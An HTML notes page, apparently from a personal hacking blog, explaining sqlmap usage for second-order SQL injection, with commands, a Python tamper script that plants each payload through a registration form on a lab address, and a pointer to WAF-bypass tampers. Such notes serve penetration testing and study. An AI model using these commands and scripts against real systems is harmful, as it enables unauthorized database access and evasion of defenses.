@@ -1,0 +1,145 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<!-- 2023-07-12 Wed 22:35 -->
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>SQLMap</title>
+<meta name="generator" content="Org Mode" />
+<link rel="stylesheet" href="/static/org.css" />
+</head>
+<body>
+<div id="preamble" class="status">
+<nav class="navbar">
+  <div class="navbar-mode-line">
+    <a href="/" class="navbar-circle">◉</a>
+    <a href="/programming" class="navbar-filename">Programming</a>
+    <a href="/hacking" class="navbar-filename">Hacking</a>
+    <a href="/Tutorial" class="navbar-filename">Tutorials</a>
+    <a href="/posts.html" class="navbar-filename">All Posts</a>
+    <a href="/rss.xml" class="navbar-filename">Rss Feed</a>
+  </div>
+</nav>
+</div>
+<div id="content" class="content">
+<h1 class="title">SQLMap</h1>
+<div id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#orgbffb990">SQLMap</a>
+<ul>
+<li><a href="#org1b93e98">Second Order Injection</a></li>
+<li><a href="#org233d5e8">Bypassing WAF</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-orgbffb990" class="outline-2">
+<h2 id="orgbffb990">SQLMap</h2>
+<div class="outline-text-2" id="text-orgbffb990">
+<p>
+Sqlmap is an advanced tool for finding and exploiting <a href="20221213185522-sql_injection.html#ID-81d62666-4ce8-4244-b498-739a680f9673">SQL Injection</a>.
+</p>
+</div>
+
+<div id="outline-container-org1b93e98" class="outline-3">
+<h3 id="org1b93e98">Second Order Injection</h3>
+<div class="outline-text-3" id="text-org1b93e98">
+<p>
+For very simple use cases you might not need a tamper script
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">sqlmap -r request.raw -p parameter --second-url url2
+</pre>
+</div>
+<p>
+there is also another option for sending another request if needed
+</p>
+<div class="org-src-container">
+<pre class="src src-shell">sqlmap -r request.raw -p parameter --second-req request2.raw
+</pre>
+</div>
+
+<p>
+If more is needed to be done then you need to create a tamper script.
+create a dir for the tamper name it like second for example
+</p>
+<div class="org-src-container">
+<pre class="src src-shell">mkdir second
+touch -p second/__init__.py
+</pre>
+</div>
+<p>
+then write the tamper script.<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>
+</p>
+<div class="org-src-container">
+<pre class="src src-python"><span style="font-weight: bold; font-style: italic;">#</span><span style="font-weight: bold; font-style: italic;">!/usr/bin/env python</span>
+
+<span style="font-weight: bold;">import</span> re
+<span style="font-weight: bold;">import</span> requests
+<span style="font-weight: bold;">from</span> lib.core.enums <span style="font-weight: bold;">import</span> PRIORITY
+<span style="font-weight: bold; font-style: italic;">__priority__</span> = PRIORITY.NORMAL
+
+<span style="font-weight: bold;">def</span> <span style="font-weight: bold;">dependencies</span>():
+    <span style="font-weight: bold;">pass</span>
+
+<span style="font-weight: bold;">def</span> <span style="font-weight: bold;">login_account</span>(payload):
+    <span style="font-weight: bold; font-style: italic;">proxies</span> = {<span style="font-style: italic;">'http'</span>:<span style="font-style: italic;">'http://127.0.0.1:8080'</span>}
+    <span style="font-weight: bold; font-style: italic;">cookies</span> = {<span style="font-style: italic;">"PHPSESSID"</span>: <span style="font-style: italic;">"6laafab1f6om5rqjsbvhmq9mf2"</span>}
+
+    <span style="font-weight: bold; font-style: italic;">params</span> = {<span style="font-style: italic;">"username"</span>:<span style="font-style: italic;">"asdasdasd"</span>, <span style="font-style: italic;">"email"</span>:payload, <span style="font-style: italic;">"password"</span>:<span style="font-style: italic;">"11111111"</span>}
+    <span style="font-weight: bold; font-style: italic;">url</span> = <span style="font-style: italic;">"http://10.10.10.10/create.php"</span>
+    <span style="font-weight: bold; font-style: italic;">pr</span> = requests.post(url, data=params, cookies=cookies, verify=<span style="font-weight: bold; text-decoration: underline;">False</span>, allow_redirects=<span style="font-weight: bold; text-decoration: underline;">True</span>, proxies=proxies)
+
+    url = <span style="font-style: italic;">"http://10.10.10.10/exit.php"</span>
+    pr = requests.get(url, cookies=cookies, verify=<span style="font-weight: bold; text-decoration: underline;">False</span>, allow_redirects=<span style="font-weight: bold; text-decoration: underline;">True</span>, proxies=proxies)
+
+<span style="font-weight: bold;">def</span> <span style="font-weight: bold;">tamper</span>(payload, **kwargs):
+    headers = kwargs.get(<span style="font-style: italic;">"headers"</span>, {})
+    login_account(payload)
+    <span style="font-weight: bold;">return</span> payload
+</pre>
+</div>
+<p>
+By using tampers you should be able to set sqlmap up for most tasks. They are executed before starting injection to try and it must always return a payload.<sup><a id="fnr.1.100" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>
+</p>
+</div>
+</div>
+
+<div id="outline-container-org233d5e8" class="outline-3">
+<h3 id="org233d5e8">Bypassing WAF</h3>
+<div class="outline-text-3" id="text-org233d5e8">
+<p>
+Checkout the different tamper scripts that can modify the requests.
+</p>
+<div class="org-src-container">
+<pre class="src src-shell">sqlmap --list-tampers
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="footnotes">
+<h2 class="footnotes">Footnotes: </h2>
+<div id="text-footnotes">
+
+<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
+<a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap/second-order-injection-sqlmap">https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap/second-order-injection-sqlmap</a>
+</p></div></div>
+
+
+</div>
+</div></div>
+<div id="postamble" class="status">
+<p class="author">Author:  (<a href="mailto:unseen@flake">unseen@flake</a>)</p>
+<p class="date">Date: </p>
+<p class="creator"><a href="https://www.gnu.org/software/emacs/">Emacs</a> 28.2 (<a href="https://orgmode.org">Org</a> mode 9.5.5)</p>
+<p class="validation"></p>
+</div>
+</body>
+</html>
